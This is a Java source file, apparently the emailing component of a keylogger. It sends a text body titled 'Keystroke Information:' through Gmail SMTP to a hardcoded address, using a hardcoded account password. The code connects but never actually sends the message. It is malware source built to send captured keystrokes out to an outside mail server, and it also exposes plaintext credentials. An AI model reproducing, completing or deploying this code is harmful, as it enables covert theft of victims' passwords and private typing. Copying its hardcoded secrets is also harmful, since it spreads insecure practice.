package handlers;

import java.util.Properties;

import javax.mail.Message.RecipientType;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class Sender {
	
	private Sender(){};
	private static final String SENDERS_GMAIL = "pan4ipano@gmail.com";
	private static final String SENDERS_PASSWORD = "panopan4i";
	
	private static final String RECEIVER_EMAIL = "pan4ipano@gmail.com";
	
	private static Properties mailServerProperties;
	private static Session mailSession;
	private static MimeMessage mailMessage;
	
	public static void sendMail(String emailbody) throws Throwable {
		
		System.setProperty("javax.net.debug", "ssl,handshake");
		System.setProperty("https.protocols", "TLSv1.2");
		mailServerProperties = System.getProperties();
		mailServerProperties.put("mail.smtp.port", "587");
		mailServerProperties.put("mail.smtp.auth", "true");
		mailServerProperties.put("mail.smtp.starttls.enable", "true");
		/*// Set SMTP server properties
        props.put("mail.smtp.auth", "true"); // Enable SMTP authentication --->done
        props.put("mail.smtp.starttls.enable", "true"); // Enable STARTTLS --->done
        props.put("mail.smtp.starttls.required", "true"); // Require STARTTLS
        props.put("mail.smtp.host", "smtp.example.com"); // Set your SMTP server host
        props.put("mail.smtp.port", "587"); // Set the SMTP port ---->done
        props.put("mail.smtp.ssl.protocols", "TLSv1.2"); // Specify TLS version*/
		
		mailSession = Session.getDefaultInstance(mailServerProperties);
		
		mailMessage = new MimeMessage(mailSession);
		mailMessage.addRecipient(RecipientType.BCC, new InternetAddress(RECEIVER_EMAIL));
		mailMessage.setSubject("Keystroke Information:");
		mailMessage.setContent(emailbody,"text/html");
		
		Transport transport = mailSession.getTransport("smtp");
		transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWORD);
	}
}